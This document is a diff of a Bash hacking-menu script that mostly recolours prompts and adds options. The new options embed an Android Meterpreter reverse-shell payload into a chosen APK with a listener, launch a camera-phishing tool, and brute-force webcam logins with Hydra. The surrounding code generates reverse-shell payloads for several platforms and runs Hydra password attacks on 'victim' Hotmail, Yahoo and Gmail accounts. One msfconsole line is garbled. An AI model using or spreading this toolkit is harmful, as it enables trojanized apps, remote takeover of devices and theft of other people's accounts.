 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2042,7 +2341,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 toilet "START" | lolcat
@@ -2061,7 +2360,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2069,7 +2368,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2077,7 +2376,7 @@ echo ""
 echo -e $green "What is Name Payload? "
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2092,7 +2391,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$
 echo ""
 echo ""
 echo -e $green "do you want start  metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -2102,7 +2401,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2110,7 +2409,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 toilet "START" | lolcat
@@ -2146,7 +2445,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2154,7 +2453,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2162,7 +2461,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2175,6 +2474,81 @@ echo ""
 
 msfconsole -x 'use exploit/android/fileformat/adobe_read -p " insert : "er_pdf_js_interface.rb' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit' 
 bash Tools-Hk.sh
+fi
+if [ $pa = 10 ]
+then
+clear
+figlet "Embed Payload in APk"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is LHOST"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $green
+read -p " insert : " lhost
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is LPORT"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $green
+read -p " insert : " lport
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "Path save APK "
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $green
+read -p " insert path with file.apk: " apkliget
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is Payload Name? "
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $green
+read -p " insert as SignApk without .apk: " name
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
+echo ""
+echo -e $green "What is path seve "
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
+read -p " insert : " pathsave
+echo ""
+toilet "Loading" | lolcat
+msfvenom -x $apkliget -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.apk
+echo ""
+echo -e $green "do you want start  metasploit? y/n"
+echo -e $green
+read -p " insert : " yes_no
+if [ $yes_no = "y" ]
+then
+clear
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is LHOST"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $green
+read -p " insert : " host
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo ""
+echo -e $green "What is LPORT"
+echo ""
+echo '~_~_~_~_~_~_~_~_~_~_~_~_'
+echo -e $green
+read -p " insert : " port
+echo ""
+toilet "START" | lolcat
+msfconsole -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; exploit"
+else
+bash Tools-Hk.sh
+fi
 fi
 if [ $pa = 00 ]
 then
@@ -2190,12 +2564,21 @@ fi
 if [ $injection_payload = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "PAYMAX"
 cd ~
 cd PAYMAX
 python2 paymax.py
 bash Tools-Hk.sh
+fi
+if [ $injection_payload = 4 ]
+then
+clear
+
+head
+dependencies
+camphish
+
 fi
 if [ $injection_payload = 00 ]
 then
@@ -2208,11 +2591,11 @@ if [ $kali = 2 ]
 then
 clear
 head
-echo -e $red   "Scan Ip"
+echo -e $green   "Scan Ip"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " nmap"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Devploit"
+echo -e $green     '{ -2- } ===> ' $green " Devploit"
 echo ""
 echo ""
 echo -e $green     "00- BACK"
@@ -2225,7 +2608,7 @@ clear
 figlet "scan nmap"
 echo ""
 echo -e $green "What is Ip web/device "
-echo -e $red
+echo -e $green
 read -p " insert : " ip
 echo ""
 toilet "Loading" 
@@ -2253,15 +2636,15 @@ if [ $kali = 3 ]
 then
 clear
 head
-echo -e $red   "Account Hack"
+echo -e $green   "Account Hack"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Crunch wordlist"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Hydra"
+echo -e $green     '{ -2- } ===> ' $green " Hydra"
 echo ""
 echo -e $green     '{ -3- } ===> ' $white " weeman"
 echo ""
-echo -e $green     '{ -4- } ===> ' $red " socialfish"
+echo -e $green     '{ -4- } ===> ' $green " socialfish"
 echo ""
 echo ""
 echo -e $green     "00- BACK"
@@ -2274,22 +2657,22 @@ clear
 figlet "Creat wordlist"
 echo ""
 echo -e $green "what is the username ? "
-echo -e $red
+echo -e $green
 read -p " insert : " user
 echo -e $green "the phone or any number .. "
-echo -e $red
+echo -e $green
 read -p " insert : " phone
 echo -e $green "name list ex :pass.txt "
-echo -e $red
+echo -e $green
 read -p " insert : " namelist
 echo -e $green "little user name + phone = ? example : mohammed773532224 = little = 8 phone =9 then 8+9=17 "
-echo -e $red
+echo -e $green
 read -p " insert : " much
 echo -e $green "please insert path save ex:/sdcard/"
-echo -e $red
+echo -e $green
 read -p " insert : " pathsave
 echo -e $green "insert your pass hack ex:user@@@@@"
-echo -e $red
+echo -e $green
 read -p " insert : " num
 toilet "Loading"
 crunch $much $much $phone -t $num -o $pathsave$namelist
@@ -2299,11 +2682,11 @@ if [ $accountHk = 2 ]
 then
 clear
 head
-echo -e $red   "Hydra"
+echo -e $green   "Hydra"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Hotmail"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Yahoo"
+echo -e $green     '{ -2- } ===> ' $green " Yahoo"
 echo ""
 echo -e $green     '{ -3- } ===> ' $white " Gmail"
 echo ""
@@ -2316,10 +2699,10 @@ then
 clear
 figlet "Hotmail Hack"
 echo -e $yellow "please insert vactime email ..""ex : hdhw@hotmail.com"
-echo -e $red
+echo -e $green
 read -p " insert : " hayd
 echo -e $yellow "please insert path wordlist .."" ex : $HOME/pass.txt"
-echo -e $red
+echo -e $green
 read -p " insert : " pass
 hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.live.com smtp
 fi
@@ -2328,10 +2711,10 @@ then
 clear
 figlet "Yahoo Hack"
 echo -e $yellow "please insert vactime email ..""ex : dhsa@yahoo.com"
-echo -e $red
+echo -e $green
 read -p " insert : " hayd
 echo -e $yellow "please insert path wordlist ...""ex : $HOME/pass.txt"
-echo -e $red
+echo -e $green
 read -p " insert : " pass
 hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.mail.yahoo smtp
 bash Tools-Hk.sh
@@ -2341,10 +2724,10 @@ then
 clear
 figlet "Gmail Hack"
 echo -e $yellow "please insert victim email .."
-echo -e $red
+echo -e $green
 read -p " insert : " hayd
 echo -e $yellow "please insert path wordlist..."
-echo -e $red
+echo -e $green
 read -p " insert : " pass
 hydra -S -l $hayd -P $pass -v -V -e ns -s 465 smtp.gmail.com smtp
 bash Tools-Hk.sh
@@ -2386,19 +2769,19 @@ if [ $kali = 4 ]
 then
 clear
 head
-echo -e $red   "web hack"
+echo -e $green   "web hack"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Sqlmap"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Scriptux(creat index)"
+echo -e $green     '{ -2- } ===> ' $green " Scriptux(creat index)"
 echo ""
 echo -e $green     '{ -3- } ===> ' $white " sniper-h(list hash)"
 echo ""
-echo -e $green     '{ -4- } ===> ' $red " Hash Mix"
+echo -e $green     '{ -4- } ===> ' $green " Hash Mix"
 echo ""
 echo -e $green     '{ -5- } ===> ' $white " hash-identifier"
 echo ""
-echo -e $green     '{ -6- } ===> ' $red " dirsearch"
+echo -e $green     '{ -6- } ===> ' $green " dirsearch"
 echo ""
 echo -e $green     "00- BACK"
 echo ""
@@ -2510,11 +2893,11 @@ if [ $kali = 5 ]
 then
 clear
 head
-echo -e $red      " DDos Attack"
+echo -e $green      " DDos Attack"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " slowloris"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Hammer"
+echo -e $green     '{ -2- } ===> ' $green " Hammer"
 echo ""
 echo ""
 echo -e $green     "00- BACK"
@@ -2558,11 +2941,11 @@ if [ $kali = 6 ]
 then
 clear
 head
-echo -e $red   "Scan port"
+echo -e $green   "Scan port"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " nmap"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Devploit"
+echo -e $green     '{ -2- } ===> ' $green " Devploit"
 echo ""
 echo ""
 echo -e $green     "00- BACK"
@@ -2575,7 +2958,7 @@ clear
 figlet "scan nmap"
 echo ""
 echo -e $green "What is Ip  web/device "
-echo -e $red
+echo -e $green
 read -p " insert : " ip
 echo ""
 toilet "Loading" 
@@ -2602,7 +2985,7 @@ if [ $kali = 7 ]
 then
 clear
 head
-echo -e $red   "cread -p " insert : " word list by crunch"
+echo -e $green   "cread -p " insert : " word list by crunch"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " creat (list password)"
 echo ""
@@ -2620,7 +3003,7 @@ echo -e $green "what is the first: char or number ? ex: 12 "
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 
-echo -e $red
+echo -e $green
 read -p " insert : " user
 
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2629,7 +3012,7 @@ echo -e $green " second:  insert  any number .. ex: 123456 "
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 
-echo -e $red
+echo -e $green
 read -p " insert : " phone
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 echo ""
@@ -2637,7 +3020,7 @@ echo -e $green "name list ex :pass.txt "
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 
-echo -e $red
+echo -e $green
 read -p " insert : " namelist
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 echo ""
@@ -2645,7 +3028,7 @@ echo -e $green " sum little first  + second = ? example : mohammed773532224 = fi
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 
-echo -e $red
+echo -e $green
 read -p " insert : " much
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 echo ""
@@ -2653,7 +3036,7 @@ echo -e $green "please insert path save ex:/sdcard/"
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 
-echo -e $red
+echo -e $green
 read -p " insert : " pathsave
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 echo ""
@@ -2661,7 +3044,7 @@ echo -e $green "insert your pass hack ex:first@@@@@"
 echo ""
 echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 
-echo -e $red
+echo -e $green
 read -p " insert : " num
 toilet "Loading"
 crunch $much $much $phone -t $num -o $pathsave$namelist
@@ -2674,6 +3057,24 @@ clear
 bash Tools-Hk.sh
 fi
 fi
+if [ $kali = 8 ]
+then
+figlet "Hack WebCam Ip With Hydra"
+echo -e $yellow "insert the port >> "
+echo -e $green
+read -p " insert : " porthydra
+echo -e $yellow
+echo -e $green "insert the list password path /rockyou.txt >> "
+echo ""
+read -p " insert : " listpathhydra
+echo ""
+echo -e $yellow "please insert WebCam IP >>"
+echo -e $green
+read -p " insert : " webcamip
+echo ""
+hydra -s $porthydra -l admin -p $listpathhydra $webcamip -e ns -t 64 -v http-get
+fi
+
 if [ $kali = 00 ]
 then
 clear
@@ -2684,23 +3085,23 @@ if [ $usetools = 2 ]
 then
 clear
 head
-echo -e $red   "use automatic Tools"
+echo -e $green   "use automatic Tools"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " injection payloads"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Scan Ip"
+echo -e $green '{ -2- } ===> ' $green " Scan Ip"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " account hack"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " send sms"
+echo -e $green '{ -4- } ===> ' $green " send sms"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " web hack"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " dos attack"
+echo -e $green '{ -6- } ===> ' $green " dos attack"
 echo ""
 echo -e $green '{ -7- } ===> ' $white " scan port"
 echo ""
-echo -e $green '{ -8- } ===> ' $red " wifi hack"
+echo -e $green '{ -8- } ===> ' $green " wifi hack"
 echo ""
 echo -e $green "00- Back "
 echo ""
@@ -2709,11 +3110,11 @@ if [ $usage = 1 ]
 then
 clear
 head
-echo -e $red   "Injection payloads"
+echo -e $green   "Injection payloads"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " msfvenom"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Tmux-Bunch"
+echo -e $green '{ -2- } ===> ' $green " Tmux-Bunch"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " PAYMAX"
 echo ""
@@ -2725,16 +3126,16 @@ then
 clear
 echo ""
 head
-echo -e $red   "msfvenom"
+echo -e $green   "msfvenom"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " Payload Android"
-echo -e $green     '{ -2- } ===> ' $red " Payload Windows"
+echo -e $green     '{ -2- } ===> ' $green " Payload Windows"
 echo -e $green     '{ -3- } ===> ' $white " Payload Linux"
-echo -e $green     '{ -4- } ===> ' $red " Payload Mac"
+echo -e $green     '{ -4- } ===> ' $green " Payload Mac"
 echo -e $green     '{ -5- } ===> ' $white " Payload Ios"
-echo -e $green     '{ -6- } ===> ' $red " Payload Python"
+echo -e $green     '{ -6- } ===> ' $green " Payload Python"
 echo -e $green     '{ -7- } ===> ' $white " Payload url"
-echo -e $green     '{ -8- } ===> ' $red " Payload mp4"
+echo -e $green     '{ -8- } ===> ' $green " Payload mp4"
 echo -e $green     '{ -9- } ===> ' $white " Payload Pdf"
 echo ""
 
@@ -2742,7 +3143,7 @@ echo -e $green     "00- BACK"
 echo ""
 echo ""
 echo -e $green     "Enter The Number"
-echo -e $red
+echo -e $green
 read -p " insert : " pa
 if [ $pa = 1 ]
 then
@@ -2754,7 +3155,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2762,7 +3163,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2770,7 +3171,7 @@ echo ""
 echo -e $green "What is Name Payload? "
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2784,7 +3185,7 @@ toilet "Loading" | lolcat
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.apk
 echo ""
 echo -e $green "do you want start  metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -2794,7 +3195,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2802,7 +3203,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -2821,7 +3222,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2829,7 +3230,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2837,7 +3238,7 @@ echo ""
 echo -e $green "What is Name Payload?"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 
 read -p " insert : " name
 echo ""
@@ -2852,7 +3253,7 @@ toilet "loading" | lolcat
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $Pathsave/$name.exe
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -2862,7 +3263,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2870,7 +3271,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -2889,7 +3290,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2897,7 +3298,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2905,7 +3306,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2919,7 +3320,7 @@ toilet "Loading" | lolcat
 msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o $pathsave/$name.elf
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -2929,7 +3330,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2937,7 +3338,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -2958,7 +3359,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2966,7 +3367,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -2981,7 +3382,7 @@ toilet "Loading" | lolcat
 msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$lhost LPORT=$lport -o $pathsave/$name.macho
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -2991,7 +3392,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " host
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -2999,7 +3400,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " port
 echo ""
 toilet "START" | lolcat
@@ -3018,7 +3419,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3026,7 +3427,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3036,12 +3437,12 @@ echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 read -p " insert : " pathsave
 echo ""
-echo -e $red
+echo -e $green
 toilet "Loading" | lolcat
 msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.api
 echo ""
 echo -e $green "do you want start metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -3051,7 +3452,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3059,7 +3460,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3093,7 +3494,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3101,7 +3502,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3116,7 +3517,7 @@ toilet "Loading" | lolcat
 msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.py
 echo ""
 echo -e $green "do you want start  metasploit? y/n"
-echo -e $red
+echo -e $green
 read -p " insert : " yes_no
 if [ $yes_no = "y" ]
 then
@@ -3126,7 +3527,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -3134,7 +3535,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 toilet "START" | lolcat
@@ -3153,7 +3554,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -3161,7 +3562,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 msfconsole -x 'use auxiliary/gather/android_htmlfileprovider' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
@@ -3196,7 +3597,7 @@ echo ""
 echo -e $green "What is LHOST"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lhost
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
@@ -3204,7 +3605,7 @@ echo ""
 echo -e $green "What is LPORT"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_'
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3212,7 +3613,7 @@ echo ""
 echo -e $green "What is Name Payload"
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
-echo -e $red
+echo -e $green
 read -p " insert : " name
 echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
@@ -3222,7 +3623,7 @@ echo ""
 echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
 read -p " insert : " pathsave
 echo ""
-echo -e $red
+echo -e $green
 read -p " insert : " lport
 echo ""
 msfconsole -x 'use exploit/android/fileformat/adobe_read -p " insert : "er_pdf_js_interface.rb' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit' 
@@ -3238,18 +3639,18 @@ fi
 if [ $injection_payload = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 cd $Home
 figlet "Injecion apk "
 cd Tmux-Bunch
 ./tmuxbunch
 #echo ""
 #echo -e $green "What is LHOST"
-#echo -e $red
+#echo -e $green
 #read -p " insert : " lhost
 #echo ""
 #echo -e $green "What is LPORT"
-#echo -e $red
+#echo -e $green
 #read -p " insert : " lport
 #echo ""
 #echo -e $green "path target apk ex : /sdcard/whatsapp.apk?"
@@ -3262,7 +3663,7 @@ fi
 if [ $injection_payload = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "PAYMAX"
 cd ~
 cd PAYMAX
@@ -3279,11 +3680,11 @@ if [ $usage = 2 ]
 then
 clear
 head
-echo -e $red   "Scan Ip"
+echo -e $green   "Scan Ip"
 echo ""
 echo -e $green     '{ -1- } ===> ' $white " nmap"
 echo ""
-echo -e $green     '{ -2- } ===> ' $red " Devploit"
+echo -e $green     '{ -2- } ===> ' $green " Devploit"
 echo ""
 echo ""
 
@@ -3297,7 +3698,7 @@ clear
 figlet "scan nmap"
 echo ""
 echo -e $green "What is Ip web/device "
-echo -e $red
+echo -e $green
 read -p " insert : " ip
 echo ""
 toilet "Loading" 
@@ -3324,12 +3725,12 @@ if [ $usage = 3 ]
 then
 clear
 head
